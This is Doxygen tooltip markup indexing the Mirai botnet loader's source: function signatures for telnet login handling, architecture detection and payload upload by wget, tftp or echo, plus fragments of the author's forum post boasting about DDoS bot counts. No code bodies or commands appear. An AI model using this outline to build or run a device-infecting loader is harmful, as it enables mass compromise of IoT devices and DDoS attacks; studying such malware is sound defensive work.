<div class="ttc" id="structtelnet__info_html_aa5ee1ca4f4da0455d35a2407dfc7e2a0"><div class="ttname"><a href="structtelnet__info.html#aa5ee1ca4f4da0455d35a2407dfc7e2a0">telnet_info::port</a></div><div class="ttdeci">port_t port</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00008">telnet_info.h:8</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="connection_8c_html_a52bc8c56bcf36ab89f034f7f6a7e77f1"><div class="ttname"><a href="connection_8c.html#a52bc8c56bcf36ab89f034f7f6a7e77f1">connection_consume_prompt</a></div><div class="ttdeci">int connection_consume_prompt(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00213">connection.c:213</a></div></div>
<div class="ttc" id="structserver__worker_html_aef6ffc9c0b7ab0c33e0ef9e450a38c36"><div class="ttname"><a href="structserver__worker.html#aef6ffc9c0b7ab0c33e0ef9e450a38c36">server_worker::thread</a></div><div class="ttdeci">pthread_t thread</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00025">server.h:25</a></div></div>
<div class="ttc" id="connection_8c_html_aa5f67022eedf1d46da7efddad1864ecd"><div class="ttname"><a href="connection_8c.html#aa5f67022eedf1d46da7efddad1864ecd">connection_consume_copy_op</a></div><div class="ttdeci">int connection_consume_copy_op(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00456">connection.c:456</a></div></div>
<div class="ttc" id="structtelnet__info_html_a8f9f7444411b7e42fc6b098d4a14deb0"><div class="ttname"><a href="structtelnet__info.html#a8f9f7444411b7e42fc6b098d4a14deb0">telnet_info::pass</a></div><div class="ttdeci">char pass[32]</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00006">telnet_info.h:6</a></div></div>
<div class="ttc" id="loader_2src_2headers_2util_8h_html_ab0861eca69488783c03d10dd318bb02d"><div class="ttname"><a href="loader_2src_2headers_2util_8h.html#ab0861eca69488783c03d10dd318bb02d">util_socket_and_bind</a></div><div class="ttdeci">int util_socket_and_bind(struct server *srv)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2util_8c_source.html#l00064">util.c:64</a></div></div>
<div class="ttc" id="connection_8c_html_a6f9962c0bc2cedaf0de2814f4a5d4b17"><div class="ttname"><a href="connection_8c.html#a6f9962c0bc2cedaf0de2814f4a5d4b17">connection_verify_payload</a></div><div class="ttdeci">int connection_verify_payload(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00630">connection.c:630</a></div></div>
<div class="ttc" id="connection_8h_html"><div class="ttname"><a href="connection_8h.html">connection.h</a></div></div>
<div class="ttc" id="structconnection_html_a73be799c1ca19234b30e96e2f06caa16a0d9a35143bfc7e28f84ab889d545891b"><div class="ttname"><a href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a0d9a35143bfc7e28f84ab889d545891b">connection::TELNET_RUN_BINARY</a></div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00034">connection.h:34</a></div></div>
<div class="ttc" id="server_8c_html_a9085c60470ef6f94cdff3dcb4bf03f48"><div class="ttname"><a href="server_8c.html#a9085c60470ef6f94cdff3dcb4bf03f48">bind_core</a></div><div class="ttdeci">static void bind_core(int core)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00155">server.c:155</a></div></div>
<div class="ttc" id="connection_8c_html_acb23df70b10e82b394c5aea71ce22a28"><div class="ttname"><a href="connection_8c.html#acb23df70b10e82b394c5aea71ce22a28">connection_upload_wget</a></div><div class="ttdeci">int connection_upload_wget(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00601">connection.c:601</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="binary_8c_html_aaa1514c791103db3737fd7336a02bc70"><div class="ttname"><a href="binary_8c.html#aaa1514c791103db3737fd7336a02bc70">binary_get_by_arch</a></div><div class="ttdeci">struct binary * binary_get_by_arch(char *arch)</div><div class="ttdef"><b>Definition:</b> <a href="binary_8c_source.html#l00044">binary.c:44</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a5584596b6561bf1ef1c462d5032c6e12"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a></div><div class="ttdeci">#define TOKEN_QUERY</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00027">includes.h:27</a></div></div>
<div class="ttc" id="structserver_html_a9bced17fe889d8d2caa6328f8e9842a2"><div class="ttname"><a href="structserver.html#a9bced17fe889d8d2caa6328f8e9842a2">server::total_tftps</a></div><div class="ttdeci">volatile uint32_t total_tftps</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00011">server.h:11</a></div></div>
<div class="ttc" id="server_8c_html_a15c57c2a3267d6e72f11825bf46ab806"><div class="ttname"><a href="server_8c.html#a15c57c2a3267d6e72f11825bf46ab806">server_destroy</a></div><div class="ttdeci">void server_destroy(struct server *srv)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00078">server.c:78</a></div></div>
<div class="ttc" id="loader_2src_2main_8c_html_a1b6916fd6bd625513f86cc35333623c9"><div class="ttname"><a href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a></div><div class="ttdeci">static struct server * srv</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2main_8c_source.html#l00017">main.c:17</a></div></div>
<div class="ttc" id="structtelnet__info_html_acc55cc9b91cd9f473b0d5fb8082b0ef4"><div class="ttname"><a href="structtelnet__info.html#acc55cc9b91cd9f473b0d5fb8082b0ef4">telnet_info::writedir</a></div><div class="ttdeci">char writedir[32]</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00006">telnet_info.h:6</a></div></div>
<div class="ttc" id="connection_8c_html_a8c48ff1129acb53db3b30a26fd9f6e48"><div class="ttname"><a href="connection_8c.html#a8c48ff1129acb53db3b30a26fd9f6e48">connection_consume_login_prompt</a></div><div class="ttdeci">int connection_consume_login_prompt(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00149">connection.c:149</a></div></div>
<div class="ttc" id="binary_8h_html"><div class="ttname"><a href="binary_8h.html">binary.h</a></div></div>
<div class="ttc" id="structtelnet__info_html_a2c837096dce88f268d64a61d7dca67a1"><div class="ttname"><a href="structtelnet__info.html#a2c837096dce88f268d64a61d7dca67a1">telnet_info::user</a></div><div class="ttdeci">char user[32]</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00006">telnet_info.h:6</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="structconnection_html_af7b674348613e837cc719632401f41de"><div class="ttname"><a href="structconnection.html#af7b674348613e837cc719632401f41de">connection::rdbuf_pos</a></div><div class="ttdeci">uint16_t rdbuf_pos</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00041">connection.h:41</a></div></div>
<div class="ttc" id="structtelnet__info_html"><div class="ttname"><a href="structtelnet__info.html">telnet_info</a></div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00005">telnet_info.h:5</a></div></div>
<div class="ttc" id="structtelnet__info_html_a75346b6fb4a5ef349310143adbaf0647"><div class="ttname"><a href="structtelnet__info.html#a75346b6fb4a5ef349310143adbaf0647">telnet_info::upload_method</a></div><div class="ttdeci">enum telnet_info::@2 upload_method</div></div>
<div class="ttc" id="connection_8c_html_ab6b2144735ba2c7cedf9b93b4a1927db"><div class="ttname"><a href="connection_8c.html#ab6b2144735ba2c7cedf9b93b4a1927db">connection_consume_written_dirs</a></div><div class="ttdeci">int connection_consume_written_dirs(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00414">connection.c:414</a></div></div>
<div class="ttc" id="structconnection_html_a34571628b1d5cc8fb2d522ce53aa4045"><div class="ttname"><a href="structconnection.html#a34571628b1d5cc8fb2d522ce53aa4045">connection::retry_bin</a></div><div class="ttdeci">BOOL retry_bin</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00042">connection.h:42</a></div></div>
<div class="ttc" id="structserver_html_a8f7152bb17f4276b2d863369d3a3468c"><div class="ttname"><a href="structserver.html#a8f7152bb17f4276b2d863369d3a3468c">server::curr_open</a></div><div class="ttdeci">volatile uint32_t curr_open</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00010">server.h:10</a></div></div>
<div class="ttc" id="telnet__info_8h_html"><div class="ttname"><a href="telnet__info_8h.html">telnet_info.h</a></div></div>
<div class="ttc" id="connection_8c_html_ad724b4cf4d0bf51c69f33f6469ee4082"><div class="ttname"><a href="connection_8c.html#ad724b4cf4d0bf51c69f33f6469ee4082">connection_consume_arch</a></div><div class="ttdeci">int connection_consume_arch(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00465">connection.c:465</a></div></div>
<div class="ttc" id="connection_8c_html_a8727b5c3aab5a5633d98ba86a15bbcfc"><div class="ttname"><a href="connection_8c.html#a8727b5c3aab5a5633d98ba86a15bbcfc">connection_consume_arm_subtype</a></div><div class="ttdeci">int connection_consume_arm_subtype(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00538">connection.c:538</a></div></div>
<div class="ttc" id="structtelnet__info_html_a3aff74bc6c6a1bf62b5026950abfb8f9"><div class="ttname"><a href="structtelnet__info.html#a3aff74bc6c6a1bf62b5026950abfb8f9">telnet_info::has_arch</a></div><div class="ttdeci">BOOL has_arch</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00014">telnet_info.h:14</a></div></div>
<div class="ttc" id="structserver_html_a3dc885b39e0b71d53698b376f161d9df"><div class="ttname"><a href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">server::max_open</a></div><div class="ttdeci">uint32_t max_open</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00009">server.h:9</a></div></div>
<div class="ttc" id="structserver__worker_html_a34827de4a680ff23c1c2bd27e446edf2"><div class="ttname"><a href="structserver__worker.html#a34827de4a680ff23c1c2bd27e446edf2">server_worker::efd</a></div><div class="ttdeci">int efd</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00024">server.h:24</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
<div class="ttc" id="structserver_html_a627db22e8e02d706f797acae50520614"><div class="ttname"><a href="structserver.html#a627db22e8e02d706f797acae50520614">server::total_wgets</a></div><div class="ttdeci">volatile uint32_t total_wgets</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00011">server.h:11</a></div></div>
<div class="ttc" id="structconnection_html"><div class="ttname"><a href="structconnection.html">connection</a></div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00008">connection.h:8</a></div></div>
<div class="ttc" id="structtelnet__info_html_aad0667b76ed78d53e874aeacdee342a9"><div class="ttname"><a href="structtelnet__info.html#aad0667b76ed78d53e874aeacdee342a9">telnet_info::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00007">telnet_info.h:7</a></div></div>
<div class="ttc" id="connection_8c_html_a53ce7c6113c20961c61bbc6d64eae7c1"><div class="ttname"><a href="connection_8c.html#a53ce7c6113c20961c61bbc6d64eae7c1">connection_consume_cleanup</a></div><div class="ttdeci">int connection_consume_cleanup(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00643">connection.c:643</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a85a1175098aa9c4ddbd77bcf4146aea2"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a></div><div class="ttdeci">#define FN_BINARY</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00034">includes.h:34</a></div></div>
<div class="ttc" id="structserver_html_a04a30da3dd86aa73499c6d5e2e48311c"><div class="ttname"><a href="structserver.html#a04a30da3dd86aa73499c6d5e2e48311c">server::tftp_host_ip</a></div><div class="ttdeci">char * tftp_host_ip</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00012">server.h:12</a></div></div>
<div class="ttc" id="structtelnet__info_html_acf9811de9d97268f2a793111fc4b9848"><div class="ttname"><a href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">telnet_info::arch</a></div><div class="ttdeci">char arch[6]</div><div class="ttdef"><b>Definition:</b> <a href="telnet__info_8h_source.html#l00006">telnet_info.h:6</a></div></div>
<div class="ttc" id="structconnection_html_afba5e64f29f866fb5348a8def79c6b79"><div class="ttname"><a href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">connection::open</a></div><div class="ttdeci">BOOL open</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00042">connection.h:42</a></div></div>
<div class="ttc" id="connection_8c_html_a9dbd998ccf8ca5a677d860ae6ea83344"><div class="ttname"><a href="connection_8c.html#a9dbd998ccf8ca5a677d860ae6ea83344">connection_consume_psoutput</a></div><div class="ttdeci">int connection_consume_psoutput(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00246">connection.c:246</a></div></div>
<div class="ttc" id="connection_8c_html_a04dc8c68e7380236df79de3e1dc1d8bc"><div class="ttname"><a href="connection_8c.html#a04dc8c68e7380236df79de3e1dc1d8bc">connection_upload_echo</a></div><div class="ttdeci">int connection_upload_echo(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00573">connection.c:573</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa3394da986d8b9f48acb15b49ec40fc6"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa3394da986d8b9f48acb15b49ec40fc6">EXEC_QUERY</a></div><div class="ttdeci">#define EXEC_QUERY</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00030">includes.h:30</a></div></div>
<div class="ttc" id="structserver_html_ab1a292223f727e8dc33b7b32971d0ac1"><div class="ttname"><a href="structserver.html#ab1a292223f727e8dc33b7b32971d0ac1">server::bind_addrs</a></div><div class="ttdeci">ipv4_t * bind_addrs</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00015">server.h:15</a></div></div>
<div class="ttc" id="server_8c_html_ac37d85fa12abeeeccfe98a3fcf729294"><div class="ttname"><a href="server_8c.html#ac37d85fa12abeeeccfe98a3fcf729294">handle_event</a></div><div class="ttdeci">static void handle_event(struct server_worker *wrker, struct epoll_event *ev)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00184">server.c:184</a></div></div>
<div class="ttc" id="server_8h_html"><div class="ttname"><a href="server_8h.html">server.h</a></div></div>
<div class="ttc" id="structserver__worker_html_ae7be5e0b65257ad1a73cb9de934342e8"><div class="ttname"><a href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">server_worker::srv</a></div><div class="ttdeci">struct server * srv</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00023">server.h:23</a></div></div>
<div class="ttc" id="connection_8c_html_a6c25332d5f63d4d1256b55dd786e6295"><div class="ttname"><a href="connection_8c.html#a6c25332d5f63d4d1256b55dd786e6295">connection_consume_verify_login</a></div><div class="ttdeci">int connection_consume_verify_login(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00236">connection.c:236</a></div></div>
<div class="ttc" id="structconnection_html_a1c60f0a6ddc515bda7d7965f357e875e"><div class="ttname"><a href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">connection::deadline</a></div><div class="ttdeci">int deadline</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00039">connection.h:39</a></div></div>
<div class="ttc" id="structconnection_html_af94e874a059f7b544e04e5d0561f7b98"><div class="ttname"><a href="structconnection.html#af94e874a059f7b544e04e5d0561f7b98">connection::success</a></div><div class="ttdeci">BOOL success</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00042">connection.h:42</a></div></div>
<div class="ttc" id="structconnection_html_a873bc9bb606802da7e4437e60581e060"><div class="ttname"><a href="structconnection.html#a873bc9bb606802da7e4437e60581e060">connection::last_recv</a></div><div class="ttdeci">time_t last_recv</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00014">connection.h:14</a></div></div>
<div class="ttc" id="structserver_html"><div class="ttname"><a href="structserver.html">server</a></div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00008">server.h:8</a></div></div>
<div class="ttc" id="structconnection_html_a8ee851eb5e6fa61a5d361029c0e05a82"><div class="ttname"><a href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">connection::info</a></div><div class="ttdeci">struct telnet_info info</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00012">connection.h:12</a></div></div>
<div class="ttc" id="loader_2src_2headers_2util_8h_html_a60f0f1eeffd8695d82a60c980fc3adbd"><div class="ttname"><a href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a></div><div class="ttdeci">BOOL util_sockprintf(int fd, const char *fmt,...)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2util_8c_source.html#l00132">util.c:132</a></div></div>
<div class="ttc" id="structserver_html_ab158131791f1fea8a823fc2388d9ab82"><div class="ttname"><a href="structserver.html#ab158131791f1fea8a823fc2388d9ab82">server::workers_len</a></div><div class="ttdeci">uint8_t workers_len</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00018">server.h:18</a></div></div>
<div class="ttc" id="server_8c_html_af3aa5bbc2215e215af2afeb31b29bfca"><div class="ttname"><a href="server_8c.html#af3aa5bbc2215e215af2afeb31b29bfca">worker</a></div><div class="ttdeci">static void * worker(void *arg)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00165">server.c:165</a></div></div>
<div class="ttc" id="structserver_html_ab16b9ed36cc105da325d0bbbb533635e"><div class="ttname"><a href="structserver.html#ab16b9ed36cc105da325d0bbbb533635e">server::bind_addrs_len</a></div><div class="ttdeci">uint8_t bind_addrs_len</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00018">server.h:18</a></div></div>
<div class="ttc" id="connection_8c_html_abfa9e4a1232d41a78e5de0a510ed5752"><div class="ttname"><a href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a></div><div class="ttdeci">void connection_close(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00033">connection.c:33</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a1f11c989e7b279aa0b76b472b6786221"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a></div><div class="ttdeci">#define FN_DROPPER</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00033">includes.h:33</a></div></div>
<div class="ttc" id="server_8c_html_ad0ffd480caf2f4573b8ededde26577e2"><div class="ttname"><a href="server_8c.html#ad0ffd480caf2f4573b8ededde26577e2">timeout_thread</a></div><div class="ttdeci">static void * timeout_thread(void *arg)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00597">server.c:597</a></div></div>
<div class="ttc" id="structserver__worker_html"><div class="ttname"><a href="structserver__worker.html">server_worker</a></div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00022">server.h:22</a></div></div>
<div class="ttc" id="connection_8c_html_a162617f2f61ea5b24a221a6cc34d30e1"><div class="ttname"><a href="connection_8c.html#a162617f2f61ea5b24a221a6cc34d30e1">connection_open</a></div><div class="ttdeci">void connection_open(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00013">connection.c:13</a></div></div>
<div class="ttc" id="connection_8c_html_a409abf934163dd8108edb43f47abca81"><div class="ttname"><a href="connection_8c.html#a409abf934163dd8108edb43f47abca81">connection_upload_tftp</a></div><div class="ttdeci">int connection_upload_tftp(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00611">connection.c:611</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a97726887df4104b2cef8b87f76005317"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a97726887df4104b2cef8b87f76005317">ATOMIC_GET</a></div><div class="ttdeci">#define ATOMIC_GET(ptr)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00022">includes.h:22</a></div></div>
<div class="ttc" id="structconnection_html_aaecdd2ee669a3728ae131c4d09fb3a33"><div class="ttname"><a href="structconnection.html#aaecdd2ee669a3728ae131c4d09fb3a33">connection::lock</a></div><div class="ttdeci">pthread_mutex_t lock</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00009">connection.h:9</a></div></div>
<div class="ttc" id="structserver_html_a0123bc1e1ea7a40a3421b475e70702a9"><div class="ttname"><a href="structserver.html#a0123bc1e1ea7a40a3421b475e70702a9">server::curr_worker_child</a></div><div class="ttdeci">int curr_worker_child</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00019">server.h:19</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a56f296116fba633d19e0b85f3516d6b1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a56f296116fba633d19e0b85f3516d6b1">id_tag</a></div><div class="ttdeci">char * id_tag</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2main_8c_source.html#l00019">main.c:19</a></div></div>
<div class="ttc" id="structconnection_html_ad12b2efcdef5532753e20ba3a5d41bb2"><div class="ttname"><a href="structconnection.html#ad12b2efcdef5532753e20ba3a5d41bb2">connection::data</a></div><div class="ttdeci">char data[512]</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00038">connection.h:38</a></div></div>
<div class="ttc" id="loader_2src_2headers_2util_8h_html"><div class="ttname"><a href="loader_2src_2headers_2util_8h.html">util.h</a></div></div>
<div class="ttc" id="structserver_html_ad8123701a3acf99403ac059a5f541cbd"><div class="ttname"><a href="structserver.html#ad8123701a3acf99403ac059a5f541cbd">server::to_thrd</a></div><div class="ttdeci">pthread_t to_thrd</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00016">server.h:16</a></div></div>
<div class="ttc" id="structconnection_html_a4bd7d5e932f136c3674aff0425a5646d"><div class="ttname"><a href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">connection::state_telnet</a></div><div class="ttdeci">enum connection::@0 state_telnet</div></div>
<div class="ttc" id="structserver_html_a1c5a1f433b2ab8132769bbcd3f41e2c6"><div class="ttname"><a href="structserver.html#a1c5a1f433b2ab8132769bbcd3f41e2c6">server::total_logins</a></div><div class="ttdeci">volatile uint32_t total_logins</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00011">server.h:11</a></div></div>
<div class="ttc" id="structconnection_html_a85d448ea156e4e2129e1e7b0b3effcad"><div class="ttname"><a href="structconnection.html#a85d448ea156e4e2129e1e7b0b3effcad">connection::srv</a></div><div class="ttdeci">struct server * srv</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00010">connection.h:10</a></div></div>
<div class="ttc" id="connection_8c_html_a0ee0dff069c76ad003ae238270ac7c5d"><div class="ttname"><a href="connection_8c.html#a0ee0dff069c76ad003ae238270ac7c5d">connection_consume_upload_methods</a></div><div class="ttdeci">int connection_consume_upload_methods(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00556">connection.c:556</a></div></div>
<div class="ttc" id="structserver__worker_html_a291525712de364e6d7aabbbd69f593be"><div class="ttname"><a href="structserver__worker.html#a291525712de364e6d7aabbbd69f593be">server_worker::thread_id</a></div><div class="ttdeci">uint8_t thread_id</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00026">server.h:26</a></div></div>
<div class="ttc" id="server_8c_html_a87188a72b71cc1291721d426413f1290"><div class="ttname"><a href="server_8c.html#a87188a72b71cc1291721d426413f1290">server_telnet_probe</a></div><div class="ttdeci">void server_telnet_probe(struct server *srv, struct telnet_info *info)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00103">server.c:103</a></div></div>
<div class="ttc" id="server_8c_html_a619e9617d6a9c0458a29c25761a31fd1"><div class="ttname"><a href="server_8c.html#a619e9617d6a9c0458a29c25761a31fd1">server_queue_telnet</a></div><div class="ttdeci">void server_queue_telnet(struct server *srv, struct telnet_info *info)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00089">server.c:89</a></div></div>
<div class="ttc" id="structconnection_html_aa9a96cc6c66ef5a617f51247b2809a40"><div class="ttname"><a href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">connection::fd</a></div><div class="ttdeci">int fd</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00013">connection.h:13</a></div></div>
<div class="ttc" id="structconnection_html_a3afa557014f4634b44a4df220e25a20c"><div class="ttname"><a href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">connection::timeout</a></div><div class="ttdeci">uint16_t timeout</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00041">connection.h:41</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="structserver_html_a291eac3850dd90802a1dd4620256a8bb"><div class="ttname"><a href="structserver.html#a291eac3850dd90802a1dd4620256a8bb">server::total_echoes</a></div><div class="ttdeci">volatile uint32_t total_echoes</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00011">server.h:11</a></div></div>
<div class="ttc" id="structconnection_html_aa486c9e894a076331c57c4b3a4930df3"><div class="ttname"><a href="structconnection.html#aa486c9e894a076331c57c4b3a4930df3">connection::bin</a></div><div class="ttdeci">struct binary * bin</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00011">connection.h:11</a></div></div>
<div class="ttc" id="structconnection_html_a73be799c1ca19234b30e96e2f06caa16a7eff4238132aa79b49d65df7d9517f28"><div class="ttname"><a href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a7eff4238132aa79b49d65df7d9517f28">connection::TELNET_CONNECTING</a></div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00017">connection.h:17</a></div></div>
<div class="ttc" id="structconnection_html_ab61de117e5b46068d30be0c8a6f467ab"><div class="ttname"><a href="structconnection.html#ab61de117e5b46068d30be0c8a6f467ab">connection::echo_load_pos</a></div><div class="ttdeci">int echo_load_pos</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00013">connection.h:13</a></div></div>
